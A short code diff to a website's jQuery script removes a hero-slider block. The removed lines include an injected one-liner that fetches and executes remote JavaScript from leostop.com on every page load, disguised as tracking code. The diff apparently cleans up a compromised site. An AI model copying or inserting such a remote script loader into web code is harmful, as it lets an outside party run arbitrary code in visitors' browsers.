@@ -198,27 +198,7 @@ $(function () {
 		} );
 	});
 	
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-	
+
 
 	/* Product Filters
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
